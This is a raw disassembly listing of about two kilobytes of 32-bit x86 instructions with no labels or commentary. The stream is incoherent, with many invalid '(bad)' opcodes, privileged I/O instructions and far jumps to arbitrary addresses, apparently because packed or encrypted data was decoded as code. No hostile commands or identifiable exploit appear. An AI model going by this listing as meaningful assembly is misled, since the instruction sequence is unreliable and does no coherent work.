  4090b6:	inc    edi
  4090b7:	push   0xf1e77bae
  4090bc:	sub    ah,BYTE PTR [esi+edi*1+0x2283af11]
  4090c3:	fdiv   DWORD PTR [esi+0x2e]
  4090c6:	gs aad 0xa2
  4090c9:	pop    ss
  4090ca:	push   esp
  4090cb:	dec    eax
  4090cc:	inc    edx
  4090cd:	scas   al,BYTE PTR es:[edi]
  4090ce:	in     eax,dx
  4090cf:	jbe    0x409109
  4090d1:	popf   
  4090d2:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4090d3:	inc    edx
  4090d4:	cli    
  4090d5:	shr    DWORD PTR [esi-0x93e1e68],0x97
  4090dc:	fidiv  WORD PTR [edi-0x1f]
  4090df:	sub    ebp,ebp
  4090e1:	xchg   edi,eax
  4090e2:	fld    DWORD PTR [edx]
  4090e4:	loop   0x40906b
  4090e6:	sbb    DWORD PTR [ebp+0x70],eax
  4090e9:	dec    edx
  4090ea:	mov    ch,0x1
  4090ec:	lods   al,BYTE PTR ds:[esi]
  4090ed:	stos   DWORD PTR es:[edi],eax
  4090ee:	sbb    BYTE PTR [esi-0x772cd0f3],dh
  4090f4:	rcr    BYTE PTR [edi-0x47147c0f],1
  4090fa:	sbb    bh,BYTE PTR [ebp+0x41]
  4090fd:	stos   DWORD PTR es:[edi],eax
  4090fe:	in     al,dx
  4090ff:	and    bh,BYTE PTR [eax]
  409101:	xor    al,0x2f
  409103:	mov    bl,0x71
  409105:	sti    
  409106:	cld    
  409107:	and    DWORD PTR [esi+0x67],esi
  40910a:	xor    eax,0xc927da9e
  40910f:	fucomp st(0)
  409111:	jp     0x409169
  409113:	inc    DWORD PTR [eax+0x3929ccf1]
  409119:	(bad)
  40911d:	sbb    BYTE PTR [ecx+0x6e27a7c5],ah
  409123:	not    BYTE PTR [esp+eiz*2]
  409126:	(bad)  
  409127:	mov    eax,ds:0x73d4380f
  40912c:	jle    0x409156
  40912e:	or     BYTE PTR [edx-0x71063c99],dl
  409134:	out    dx,al
  409135:	jecxz  0x40919c
  409137:	adc    edx,ecx
  409139:	pop    ss
  40913a:	std    
  40913b:	jae    0x4090fb
  40913d:	dec    ebp
  40913e:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40913f:	sub    DWORD PTR [ecx+0x142e7f89],ecx
  409145:	ins    BYTE PTR es:[edi],dx
  409146:	xor    edx,esp
  409148:	inc    edx
  409149:	stos   BYTE PTR es:[edi],al
  40914a:	jmp    0x409192
  40914c:	add    BYTE PTR [eax-0x13c4c0fb],0x29
  409153:	shl    BYTE PTR [ecx+esi*4-0x5599eeb9],0x31
  40915b:	or     dh,BYTE PTR [ebx+eiz*4-0x8]
  40915f:	(bad)  
  409160:	in     eax,dx
  409161:	int    0xf4
  409163:	out    dx,eax
  409164:	push   edi
  409165:	sub    BYTE PTR [esi+0x2c],ch
  409168:	ret    0xe78e
  40916b:	or     eax,DWORD PTR [ecx+0x13f83fd7]
  409171:	add    eax,0xabd757a8
  409176:	mov    dl,0xb
  409178:	retf   
  409179:	jo     0x40917b
  40917b:	je     0x40914c
  40917d:	dec    eax
  40917e:	fdiv   QWORD PTR [ebp+0x481a1b35]
  409184:	dec    ebx
  409185:	retf   0xf2f0
  409188:	cmp    edi,esi
  40918a:	xchg   edi,eax
  40918b:	dec    ebx
  40918c:	cmp    DWORD PTR [ebx-0x4],ecx
  40918f:	sar    cl,1
  409191:	outs   dx,BYTE PTR ds:[esi]
  409192:	jbe    0x409212
  409194:	cmp    al,0xdc
  409196:	mov    ah,0x77
  409198:	stos   DWORD PTR es:[edi],eax
  409199:	cmc    
  40919a:	pop    edx
  40919b:	cs pop ebx
  40919d:	(bad)  
  40919e:	jmp    0x409164
  4091a0:	(bad)  
  4091a1:	xor    DWORD PTR cs:[eax],esi
  4091a4:	jnp    0x4091a6
  4091a6:	push   0x1e43f7a0
  4091ab:	fisubr WORD PTR [ebx-0x3b3b2150]
  4091b1:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4091b2:	ret    0xcc26
  4091b5:	jb     0x4091a2
  4091b7:	or     ah,BYTE PTR [eax+0x4f]
  4091ba:	or     bl,cl
  4091bc:	iret   
  4091bd:	sub    al,0xca
  4091bf:	pop    edi
  4091c0:	ret    0xc084
  4091c3:	lds    edi,FWORD PTR [eax-0x44]
  4091c6:	mov    ss,edi
  4091c8:	dec    esi
  4091c9:	or     BYTE PTR [ebp-0x68],al
  4091cc:	xchg   edx,eax
  4091cd:	lahf   
  4091ce:	stos   DWORD PTR es:[edi],eax
  4091cf:	xchg   edx,eax
  4091d0:	(bad)  
  4091d1:	sub    dl,bl
  4091d3:	icebp  
  4091d4:	fsubr  QWORD PTR [edi-0x4f519b2c]
  4091da:	jae    0x4091f2
  4091dc:	fwait
  4091dd:	or     eax,0x3618f16a
  4091e2:	ja     0x409231
  4091e4:	jle    0x409215
  4091e6:	jmp    0xb7e72aa6
  4091eb:	mov    ds:0xef4699e4,al
  4091f0:	jb     0x40926f
  4091f2:	(bad)  
  4091f3:	aaa    
  4091f4:	ins    BYTE PTR es:[edi],dx
  4091f5:	test   DWORD PTR ds:0x2e73484b,edx
  4091fb:	pop    edi
  4091fc:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4091fd:	lock jno 0x40920d
  409200:	pop    esp
  409201:	sub    cl,dh
  409203:	push   esp
  409204:	adc    al,0x92
  409206:	rcl    DWORD PTR [ecx+esi*1-0x60bcece3],1
  40920d:	hlt    
  40920e:	or     DWORD PTR [esi],edx
  409210:	pop    eax
  409211:	pop    ss
  409212:	cdq    
  409213:	repnz and ecx,DWORD PTR [ecx]
  409216:	call   0x3b22dc33
  40921b:	mov    DWORD PTR [eax+0x6a2c049e],edx
  409221:	mov    ah,0x7b
  409223:	aaa    
  409224:	push   ss
  409225:	idiv   DWORD PTR [edx-0x27]
  409228:	out    0xd1,al
  40922a:	jno    0x409269
  40922c:	push   eax
  40922d:	in     eax,dx
  40922e:	(bad)  
  40922f:	fild   WORD PTR [eax]
  409231:	aam    0x5f
  409233:	jge    0x4091e3
  409235:	xchg   ecx,eax
  409236:	addr16 retf 0xe3b2
  40923a:	pop    edi
  40923b:	mov    bh,0xc3
  40923d:	sub    bh,BYTE PTR [edi]
  40923f:	push   ebp
  409240:	ja     0x4091f6
  409242:	mov    bh,0x2
  409244:	clc    
  409245:	jmp    0x29b2888a
  40924a:	xchg   ecx,eax
  40924b:	mov    ebp,0x8d338fa9
  409250:	push   esp
  409251:	push   0xce13712a
  409256:	push   cs
  409257:	(bad)  
  409258:	mov    edi,0xe9a916b7
  40925d:	ror    ecx,1
  40925f:	rol    BYTE PTR [ecx],1
  409261:	mov    eax,ds:0x72930936
  409266:	in     al,0xcc
  409268:	add    eax,DWORD PTR [eax]
  40926a:	std    
  40926b:	pop    ecx
  40926c:	ret    
  40926d:	xchg   BYTE PTR [ebx+0x20f7f9ce],bh
  409273:	addr16 pushf 
  409275:	adc    DWORD PTR [ebx-0x10],0xfffffffc
  409279:	test   al,0xe1
  40927b:	or     cl,al
  40927d:	xor    ebx,DWORD PTR [edx-0x6d]
  409280:	add    edx,DWORD PTR [ecx+edi*2-0x7a]
  409284:	pushf  
  409285:	bsf    esi,esi
  409288:	jl     0x409281
  40928a:	call   0x647e:0xbe6708e2
  409291:	push   esp
  409292:	test   al,0x4a
  409294:	jno    0x40922b
  409296:	mov    esi,0x6ac95761
  40929b:	mov    edi,0x9f428a1d
  4092a0:	mov    edi,0x64623ca
  4092a5:	pop    gs
  4092a7:	dec    edx
  4092a8:	dec    esi
  4092a9:	cmp    DWORD PTR [ecx+0x6a667f5b],edx
  4092af:	stos   BYTE PTR es:[edi],al
  4092b0:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4092b1:	(bad)  
  4092b2:	repnz sti 
  4092b4:	dec    ecx
  4092b5:	lahf   
  4092b6:	daa    
  4092b7:	sub    eax,0x6fe7dd26
  4092bc:	idiv   BYTE PTR [eax-0x1a0433c6]
  4092c2:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4092c3:	stc    
  4092c4:	inc    ecx
  4092c5:	lea    esp,[esi+0x6]
  4092c8:	pop    esi
  4092c9:	xor    esp,DWORD PTR ds:0x7458fb70
  4092cf:	cmp    BYTE PTR [edx+0x3cb95d00],bh
  4092d5:	mov    ds:0xa960f5bc,eax
  4092da:	sub    al,BYTE PTR [ebp+0x606efce]
  4092e0:	jnp    0x409358
  4092e2:	addr16 jo 0x409309
  4092e5:	mov    ebx,0x4a3db697
  4092ea:	pop    edx
  4092eb:	mov    DWORD PTR [edi],0x292b779c
  4092f1:	push   esp
  4092f2:	push   cs
  4092f3:	lea    esp,[eax+0x27]
  4092f6:	xor    edi,DWORD PTR [esi+0x2e446287]
  4092fc:	in     al,dx
  4092fd:	add    bh,bh
  4092ff:	and    BYTE PTR [esi+ecx*1+0x41],0x97
  409304:	test   al,0x3e
  409306:	sub    eax,DWORD PTR [ecx-0xaeecad0]
  40930c:	add    BYTE PTR [edx-0x53],0x7e
  409310:	xchg   ebp,eax
  409311:	pop    ss
  409312:	fdiv   QWORD PTR [eax]
  409314:	in     al,0x3
  409316:	cli    
  409317:	in     al,dx
  409318:	outs   dx,DWORD PTR ds:[esi]
  409319:	mov    ds:0xfe85bdd4,eax
  40931e:	mov    bh,0x7a
  409320:	add    ah,BYTE PTR [esi+eax*1-0x7e]
  409324:	out    0x88,al
  409326:	test   DWORD PTR [edx+0x5a2f1862],0x14e11231
  409330:	xor    eax,0x19d5fd94
  409335:	ja     0x409364
  409337:	xchg   esp,eax
  409338:	in     eax,0x49
  40933a:	sti    
  40933b:	add    al,0xe9
  40933d:	jbe    0x409337
  40933f:	sub    eax,DWORD PTR [eax]
  409341:	dec    edi
  409342:	adc    edi,edx
  409344:	jmp    0x40933c
  409346:	xchg   esp,eax
  409347:	jo     0x4093ae
  409349:	rol    DWORD PTR [ebp+eax*2+0x41],1
  40934d:	dec    ebp
  40934e:	and    DWORD PTR [edi-0x57],esp
  409351:	push   ss
  409352:	mov    al,0x74
  409354:	jne    0x40937e
  409356:	sub    al,0x7b
  409358:	mov    ebx,0x4c7ddb66
  40935d:	jmp    0x409322
  40935f:	sbb    BYTE PTR fs:[ecx+0x13],dl
  409363:	aam    0xe8
  409365:	cmp    bl,bl
  409367:	cmp    DWORD PTR [eax-0x9decba7],ecx
  40936d:	xor    DWORD PTR [eax-0x3c671352],0xffffffcc
  409374:	jno    0x4093e7
  409376:	(bad)  
  409377:	fcmovb st,st(1)
  409379:	jle    0x4093a2
  40937b:	mov    WORD PTR [edx-0x4e9a0837],cs
  409381:	mov    ecx,0xe0d038c8
  409386:	(bad)  
  409388:	fs xchg ecx,eax
  40938b:	imul   esp,DWORD PTR [eax+0x5f],0x4b
  40938f:	icebp  
  409390:	inc    eax
  409391:	add    BYTE PTR [eax-0x57],0x56
  409395:	jp     0x4093da
  409397:	dec    BYTE PTR [ebx+eax*1-0x21eeaaa1]
  40939e:	or     DWORD PTR [esp+ebp*2+0x4588d710],edi
  4093a5:	mov    dh,BYTE PTR [edx+0x5cf102dc]
  4093ab:	sub    eax,0x6104443e
  4093b0:	cmp    BYTE PTR [ebp-0x25965567],ah
  4093b6:	and    al,0xe1
  4093b8:	repnz aaa 
  4093ba:	dec    esi
  4093bb:	pop    es
  4093bc:	rcr    BYTE PTR [eax-0x72],0xea
  4093c0:	dec    esp
  4093c1:	popa   
  4093c2:	or     esp,ecx
  4093c4:	jmp    0xdbc1:0x1182fcc7
  4093cb:	call   0xf8677b63
  4093d0:	inc    edx
  4093d1:	jnp    0x409390
  4093d3:	fs push esi
  4093d5:	call   0x2c53:0xa15f0a9f
  4093dc:	repnz mov ebp,0x32c5f253
  4093e2:	dec    ebx
  4093e3:	mov    ds:0x65c9e33a,eax
  4093e8:	and    BYTE PTR [ebp+0x289cc55c],bl
  4093ee:	nop
  4093ef:	pop    eax
  4093f0:	sbb    bh,BYTE PTR ds:0xc7a1ed7
  4093f6:	scas   al,BYTE PTR es:[edi]
  4093f7:	push   eax
  4093f8:	dec    edx
  4093f9:	fwait
  4093fa:	mov    ecx,0x7ba93fc8
  4093ff:	or     bh,BYTE PTR [ebp+0x2c99217f]
  409405:	pop    ds
  409406:	fnsave [edi-0x57964331]
  40940c:	add    al,0x40
  40940e:	clc    
  40940f:	fsincos 
  409411:	xchg   ebx,eax
  409412:	cld    
  409413:	push   esi
  409414:	into   
  409415:	in     eax,0x6
  409417:	add    eax,DWORD PTR [ecx]
  409419:	(bad)  
  40941a:	faddp  st(7),st
  40941c:	push   edi
  40941d:	mov    al,ds:0x49e1e310
  409422:	mov    bh,0xe1
  409424:	stos   DWORD PTR es:[edi],eax
  409425:	sub    eax,0xd1adcbe
  40942a:	sub    DWORD PTR [ecx-0x5cc9fd3a],edi
  409430:	adc    bl,BYTE PTR ds:0xa03c8f6b
  409436:	aaa    
  409437:	or     BYTE PTR [ecx+0x1d9dfb6a],ah
  40943d:	rcl    BYTE PTR [esi],1
  40943f:	loopne 0x4093ec
  409441:	aam    0xf
  409443:	jge    0x409400
  409445:	or     al,0x61
  409447:	out    dx,eax
  409448:	mov    eax,ds:0xfb98429f
  40944d:	hlt    
  40944e:	xchg   BYTE PTR ds:0x91748133,ah
  409454:	jp     0x409422
  409456:	mov    ebx,DWORD PTR [ebp+0x41]
  409459:	neg    DWORD PTR [ebx-0x668b2a2c]
  40945f:	mul    DWORD PTR [edx]
  409461:	shl    bh,1
  409463:	inc    eax
  409464:	xor    BYTE PTR [edi-0x22],al
  409467:	sub    eax,0x84564959
  40946c:	push   edx
  40946d:	fs xchg edi,eax
  40946f:	or     ch,0xac
  409472:	cmp    dl,BYTE PTR [ecx+0x6a]
  409475:	(bad)  
  409476:	iret   
  409477:	fdiv   QWORD PTR [edx-0x4]
  40947a:	fwait
  40947b:	dec    eax
  40947c:	mov    bl,BYTE PTR [eax+0x69]
  40947f:	push   edi
  409480:	in     al,dx
  409481:	or     BYTE PTR [edx],dh
  409483:	jne    0x4094ef
  409485:	retf   0xdba0
  409488:	bound  ecx,QWORD PTR [eax]
  40948a:	(bad)  
  40948b:	cmp    al,0x4a
  40948d:	mov    WORD PTR [edi+edx*1],?
  409490:	popf   
  409491:	lods   al,BYTE PTR ds:[esi]
  409492:	(bad)  
  409493:	sbb    al,BYTE PTR [ebx-0x5f]
  409496:	mov    bl,0xd
  409499:	jno    0x4094f8
  40949b:	es sahf 
  40949d:	test   DWORD PTR [ecx-0x430afb24],0x88fb2409
  4094a7:	push   ds
  4094a8:	cmp    esi,DWORD PTR [esi]
  4094aa:	or     esp,esi
  4094ac:	jg     0x40951e
  4094ae:	call   0xe6b6ca37
  4094b3:	mov    BYTE PTR ds:0xcd11853e,dl
  4094b9:	ret    0xf2fa
  4094bc:	cmp    dh,bh
  4094be:	call   0x5607:0xc43eaaa0
  4094c5:	sbb    bl,cl
  4094c7:	push   0x9015c3c1
  4094cc:	repnz fcmove st,st(4)
  4094cf:	popf   
  4094d0:	jnp    0x409452
  4094d2:	sar    dl,1
  4094d4:	jle    0x409480
  4094d6:	pop    edi
  4094d7:	and    eax,DWORD PTR [eax]
  4094d9:	mov    ch,0x6e
  4094db:	sbb    bl,al
  4094dd:	retf   0x7a88
  4094e0:	clc    
  4094e1:	out    0x6b,al
  4094e3:	lahf   
  4094e4:	imul   edi,DWORD PTR [edi-0x5e96bac9],0xffffffac
  4094eb:	aas    
  4094ec:	xor    bl,BYTE PTR [edi+0x245659e9]
  4094f2:	icebp  
  4094f3:	daa    
  4094f4:	mov    edx,0xf6614dea
  4094f9:	inc    ebx
  4094fa:	or     DWORD PTR [esi],eax
  4094fc:	bound  eax,QWORD PTR [ebx]
  4094fe:	ficom  WORD PTR [ecx-0x11]
  409501:	(bad)  
  409503:	ficom  WORD PTR [edx-0x67]
  409506:	call   0xab0c:0xafec66cd
  40950d:	outs   dx,BYTE PTR ds:[esi]
  40950e:	les    ecx,FWORD PTR [edi+0x37]
  409511:	(bad)  
  409512:	sti    
  409513:	das    
  409514:	pop    edx
  409515:	jnp    0x409525
  409517:	xchg   esp,eax
  409518:	lea    esi,[esp+edi*1-0x35]
  40951c:	push   0xf8bd1cfb
  409521:	cmp    ebp,ecx
  409523:	add    BYTE PTR [ecx+0x363ff27c],dl
  409529:	in     eax,dx
  40952a:	mov    bh,0xbd
  40952c:	cmp    al,0x50
  40952e:	int3   
  40952f:	jnp    0x409556
  409531:	dec    esp
  409532:	sahf   
  409533:	aaa    
  409534:	dec    edx
  409535:	sbb    bh,BYTE PTR [eax+edx*1+0x77b6251f]
  40953c:	sub    al,0xb8
  40953e:	cs (bad) 
  409540:	retf   
  409541:	sub    esp,edi
  409543:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  409544:	mov    WORD PTR [edi],ds
  409546:	imul   ebp,ebx,0xffffffb8
  409549:	cmp    dh,BYTE PTR [eax+0x2e]
  40954c:	xor    eax,0xc2279bf1
  409551:	pop    ds
  409552:	repz (bad) 
  409554:	(bad)  
  409556:	outs   dx,DWORD PTR ds:[esi]
  409557:	jg     0x40957d
  409559:	rdmsr  
  40955b:	es icebp 
  40955d:	xor    eax,DWORD PTR ds:0x7a8c453
  409563:	xchg   ecx,eax
  409564:	call   0x5e8b:0x4e31c8f4
  40956b:	push   ds
  40956c:	dec    eax
  40956d:	xchg   ecx,eax
  40956e:	out    0xd8,eax
  409570:	dec    edx
  409571:	sbb    BYTE PTR [ebp+0x30],al
  409574:	pop    eax
  409575:	jmp    0x70bd225f
  40957a:	in     eax,dx
  40957b:	push   es
  40957c:	rcr    BYTE PTR [esi+0x54e3d4d7],1
  409582:	inc    ecx
  409583:	adc    eax,0x26d66fcc
  409588:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  409589:	jle    0x4095d5
  40958b:	adc    DWORD PTR [eax+0x54],ebx
  40958e:	sub    DWORD PTR [esi],0xeb87473
  409594:	jecxz  0x40952a
  409596:	mov    eax,ds:0xf3a09875
  40959b:	pop    ecx
  40959c:	(bad)  
  40959d:	mov    al,0xa2
  40959f:	adc    BYTE PTR [ebx+esi*8+0x2],ch
  4095a3:	test   BYTE PTR [edx+0x2e],ah
  4095a6:	mov    bh,0xe
  4095a8:	data16 stos BYTE PTR es:[edi],al
  4095aa:	add    BYTE PTR [ecx-0xba80666],ah
  4095b0:	adc    eax,0x7
  4095b3:	fld    st(4)
  4095b5:	fild   WORD PTR [eax+eax*2]
  4095b8:	sbb    ebp,esp
  4095ba:	popf   
  4095bb:	xor    edi,DWORD PTR [edi+edi*8]
  4095be:	leave  
  4095bf:	mov    eax,0x4c0e9c2b
  4095c4:	adc    al,0x5b
  4095c6:	shr    DWORD PTR [ebp-0x6f],cl
  4095c9:	pop    esi
  4095ca:	cwde   
  4095cb:	xlat   BYTE PTR ds:[ebx]
  4095cc:	rol    BYTE PTR [eax+0x37],0x46
  4095d0:	js     0x409627
  4095d2:	mov    ah,BYTE PTR [esi+0x21]
  4095d5:	adc    BYTE PTR [ecx+0x75a94b51],bl
  4095db:	out    dx,al
  4095dc:	xor    edx,esi
  4095de:	sti    
  4095df:	(bad)  
  4095e0:	out    0x3c,eax
  4095e2:	mov    edx,0xff6d0f7e
  4095e7:	pop    esp
  4095e8:	es jg  0x4095ce
  4095eb:	add    DWORD PTR [ecx-0x23],0x6d
  4095ef:	xchg   BYTE PTR [eax+0x6efe131d],ah
  4095f5:	mov    edx,0xbbe31933
  4095fa:	mov    bh,BYTE PTR [edi+eax*8+0x63b3ff8]
  409601:	cmp    BYTE PTR [edi],bl
  409603:	push   0x632c13
  409608:	fidivr DWORD PTR ds:0xfeefefd
  40960e:	mov    ebx,0x99c860d2
  409613:	lock icebp 
  409615:	and    ah,BYTE PTR [eax-0xe52f06e]
  40961b:	push   ss
  40961c:	in     eax,0x9f
  40961e:	jo     0x4095db
  409620:	push   esi
  409621:	cmp    DWORD PTR [edi-0x6f],0xffffffa6
  409625:	retf   0xe594
  409628:	into   
  409629:	mov    WORD PTR [esi+0x7203fc1d],?
  40962f:	popf   
  409630:	adc    eax,0x4e439752
  409635:	xchg   DWORD PTR [esi-0x6db3290a],esp
  40963b:	adc    DWORD PTR [ecx+edi*1-0x59a2ad55],esi
  409642:	or     eax,0x4896bf54
  409647:	sbb    dh,BYTE PTR [edx]
  409649:	dec    edx
  40964a:	sub    dh,BYTE PTR [esi]
  40964c:	mov    esp,0x9405f185
  409651:	sub    BYTE PTR [ebx-0x4c],bh
  409654:	xor    BYTE PTR [ebp-0x29388569],dh
  40965a:	pop    DWORD PTR [esi+edi*8+0x54d545aa]
  409661:	dec    edx
  409662:	aas    
  409663:	xchg   ah,dl
  409665:	inc    esi
  409666:	into   
  409667:	sti    
  409668:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  409669:	pop    ds
  40966a:	mov    edi,ss
  40966c:	imul   esp,DWORD PTR [ebx-0x4093eadd],0x5e
  409673:	cdq    
  409674:	or     esi,DWORD PTR [edx-0x56752b2f]
  40967a:	xor    dl,bh
  40967c:	jmp    0x2200c0e1
  409681:	jmp    0x824f:0x8a5574c
  409688:	and    DWORD PTR [eax+0x5d],esp
  40968b:	mov    bh,0xc0
  40968d:	jb     0x40961d
  40968f:	stos   DWORD PTR es:[edi],eax
  409690:	inc    esi
  409691:	out    dx,eax
  409692:	out    dx,eax
  409693:	enter  0x3a4,0xdc
  409697:	fwait
  409698:	sub    DWORD PTR [ecx+0x2112a2ae],edx
  40969e:	cld    
  40969f:	xchg   DWORD PTR [ebx+0x40aacfa6],ecx
  4096a5:	fldcw  WORD PTR [esi]
  4096a7:	inc    edx
  4096a8:	mov    dl,0xa2
  4096aa:	js     0x4096ee
  4096ac:	and    bl,BYTE PTR [ebx+0x456bd0ce]
  4096b2:	add    eax,0x1ca1b473
  4096b7:	or     al,0x5a
  4096b9:	sbb    dl,dl
  4096bb:	jbe    0x4096f3
  4096bd:	inc    esi
  4096be:	dec    ebp
  4096bf:	jnp    0x409703
  4096c1:	repnz adc al,0xf3
  4096c4:	loope  0x409706
  4096c6:	(bad)  [edi]
  4096c8:	test   eax,0x955981fa
  4096cd:	cmp    si,WORD PTR [esp+eiz*8+0x49909da5]
  4096d5:	mov    eax,ds:0x6e62d5c6
  4096da:	or     DWORD PTR ds:0x1385cf92,0x26
  4096e1:	xchg   edx,eax
  4096e2:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4096e3:	(bad)  
  4096e4:	mov    ebx,0xdb9b882c
  4096e9:	inc    ecx
  4096ea:	pop    ecx
  4096eb:	in     al,0xbe
  4096ed:	jl     0x4096bb
  4096ef:	fabs   
  4096f1:	cdq    
  4096f2:	push   0x22c61099
  4096f7:	lahf   
  4096f8:	sti    
  4096f9:	pop    eax
  4096fa:	fdiv   st(4),st
  4096fc:	enter  0x8730,0x71
  409700:	inc    edi
  409701:	mov    eax,ds:0x817ef55f
  409706:	sub    DWORD PTR es:[ebx-0x189ca9e1],edi
  40970d:	ret    0x6d98
  409710:	mov    edi,0x6bc341cc
  409715:	sub    ah,BYTE PTR [ecx+0x1f4b26b7]
  40971b:	lock sub dl,BYTE PTR [edi]
  40971e:	pop    eax
  40971f:	jbe    0x4096e2
  409721:	xor    edx,DWORD PTR [edx-0x3b]
  409724:	push   ebp
  409725:	mov    esp,0xe3a5c5fd
  40972a:	popf   
  40972b:	cmp    al,0xad
  40972d:	and    dh,al
  40972f:	test   al,0x78
  409731:	pop    ss
  409732:	jp     0x409778
  409734:	aam    0x5f
  409736:	mul    BYTE PTR [ecx]
  409738:	and    eax,0x206cca0
  40973d:	fisttp DWORD PTR ds:0x558c5d47
  409743:	retf   
  409744:	xor    ch,al
  409746:	dec    eax
  409747:	mov    esp,0x2c6ff688
  40974c:	and    edx,edx
  40974e:	and    al,0x13
  409750:	dec    ebp
  409751:	nop
  409752:	int3   
  409753:	sub    BYTE PTR [edi+0x59],dh
  409756:	mov    ah,0xb
  409758:	push   0x4ae0dbdf
  40975d:	push   0xffffff9a
  40975f:	sahf   
  409760:	loop   0x4097c0
  409762:	outs   dx,BYTE PTR ds:[esi]
  409763:	push   cs
  409764:	out    dx,al
  409765:	mov    esi,0x1968343c
  40976a:	pop    esi
  40976b:	push   cs
  40976c:	lock pushf 
  40976e:	repnz out 0xbf,al
  409771:	cmp    dl,BYTE PTR [ecx-0x20f91858]
  409777:	jp     0x409761
  409779:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40977a:	ss (bad) 
  40977c:	mov    dh,0x9f
  40977e:	and    eax,0xdca21619
  409783:	rol    BYTE PTR [ebp+edi*4+0x3d77666b],1
  40978a:	fdivr  st,st(2)
  40978c:	out    dx,eax
  40978d:	ret    
  40978e:	les    eax,FWORD PTR [ebx-0x24]
  409791:	mov    ecx,DWORD PTR [esi-0x39]
  409794:	add    ah,BYTE PTR [esi]
  409796:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  409797:	sbb    BYTE PTR [ebx+0x55fbad3f],ah
  40979d:	mov    ds:0x57141218,eax
  4097a2:	fcomp  st(1)
  4097a4:	cmp    cl,ch
  4097a6:	push   eax
  4097a7:	ss jmp 0xea02d3c1
  4097ad:	dec    ebx
  4097ae:	es xchg edi,eax
  4097b0:	outs   dx,BYTE PTR ds:[esi]
  4097b1:	pop    ss
  4097b2:	sbb    eax,0x6adc1b61
  4097b7:	jbe    0x40976d
  4097b9:	push   edi
  4097ba:	pop    esi
  4097bb:	jecxz  0x40981e
  4097bd:	imul   ebp,ecx,0x73090cbf
  4097c3:	adc    edx,DWORD PTR ss:[eax]
  4097c6:	mov    bh,0xef
  4097c8:	adc    cl,BYTE PTR [ebx+ebx*1-0x3412139c]
  4097cf:	rcl    DWORD PTR [edx],1
  4097d1:	repnz fisttp QWORD PTR [edi]
  4097d4:	push   ds
  4097d5:	jl     0x40978f
  4097d7:	call   0xd2f174f8
  4097dc:	lahf   
  4097dd:	repnz sahf 
  4097df:	inc    ebp
  4097e0:	lods   al,BYTE PTR ds:[esi]
  4097e1:	push   eax
  4097e2:	inc    eax
  4097e3:	ins    DWORD PTR es:[edi],dx
  4097e4:	xor    BYTE PTR [ecx+edx*2-0x29e4ba05],ah
  4097eb:	mov    al,ds:0x9b365959
  4097f0:	pop    ebp
  4097f1:	test   DWORD PTR [ebp+0x57],ebp
  4097f4:	lods   eax,DWORD PTR ds:[esi]
  4097f5:	loop   0x409794
  4097f7:	xlat   BYTE PTR ds:[ebx]
  4097f8:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4097f9:	cmc    
  4097fa:	jle    0x4097a3
  4097fc:	scas   al,BYTE PTR es:[edi]
  4097fd:	or     DWORD PTR [ebx],0xb
  409800:	and    bh,BYTE PTR [ebp-0x3d]
  409803:	adc    al,0x48
  409805:	repnz imul ebp
  409808:	pop    edi
  409809:	push   edi
  40980a:	test   DWORD PTR [edi+0x58],edx
  40980d:	retf   
  40980e:	push   0x4f
  409810:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  409811:	ret    
  409812:	dec    DWORD PTR [ebx]
  409814:	add    eax,0x355b3688
  409819:	jnp    0x409873
  40981b:	das    
  40981c:	ins    BYTE PTR es:[edi],dx
  40981d:	call   0x1e0:0x1464ceaf
  409824:	mov    edx,0x7268c93
  409829:	sbb    dl,0xb4
  40982c:	dec    ebx
  40982d:	cli    
  40982e:	call   0x14e:0xc8ff9549
  409835:	sar    BYTE PTR [edx+0x51060525],cl
  40983b:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40983c:	mov    ah,0x7d
  40983e:	hlt    
  40983f:	mov    ch,0x37
  409841:	push   ss
  409842:	fadd   QWORD PTR [edi]
  409844:	dec    edx
  409845:	fiadd  WORD PTR [edx-0x6e0e30b0]
  40984b:	jmp    0xc4e1:0x858c2da
  409852:	ss repz (bad) 
  409855:	cli    
  409856:	icebp  
  409857:	mov    ds:0x91d35d68,al
  40985c:	add    al,0x76
  40985e:	and    bl,BYTE PTR [ecx-0x59]
  409861:	add    ch,dh
  409863:	pop    esp
  409864:	(bad)  
  409866:	inc    ebx
  409867:	jp     0x4098bd
  409869:	sbb    DWORD PTR [eax],ecx
  40986b:	daa    
  40986c:	xchg   dl,cl
  40986e:	mov    ch,0xd6
  409870:	push   es
  409871:	jmp    0x4e4a:0xbffae93b
  409878:	jo     0x4098b8
  40987a:	stc    
  40987b:	mov    ds:0x43d40d93,eax
  409880:	mov    ah,0xfd
  409882:	and    al,0x8
  409884:	popf   
  409885:	lahf   
  409886:	jle    0x40986b
  409888:	cwde   
  409889:	jle    0x409834
  40988b:	xchg   esi,eax
  40988c:	xchg   bh,cl
  40988e:	fnstenv [edx-0x7c9eac13]
  409894:	lods   al,BYTE PTR ds:[esi]
  409895:	int    0x3e
  409897:	sbb    DWORD PTR [ebp+0x458b7e39],esi
  40989d:	adc    DWORD PTR [edx],ebx
  40989f:	ds call 0x1b048dd6
  4098a5:	cmp    eax,ebx
  4098a7:	fsubr  DWORD PTR [esi-0x3a]
  4098aa:	pop    ebp
  4098ab:	hlt    
  4098ac:	mov    eax,0x6b42c8da
  4098b1:	cli    
  4098b2:	add    ch,ch
  4098b4:	int    0xa6
  4098b6:	xchg   BYTE PTR [edx-0x41],ah
  4098b9:	popa   
  4098ba:	pop    ebx
  4098bb:	hlt    
  4098bc:	mov    WORD PTR ds:[eax+0x719e1f55],?
  4098c3:	adc    al,0xa4
  4098c5:	popf   
  4098c6:	inc    esi
  4098c7:	cmp    BYTE PTR [ebx+0x52a16146],al
  4098cd:	fcmovnu st,st(5)
  4098cf:	jle    0x4098fb
  4098d1:	xchg   esi,eax
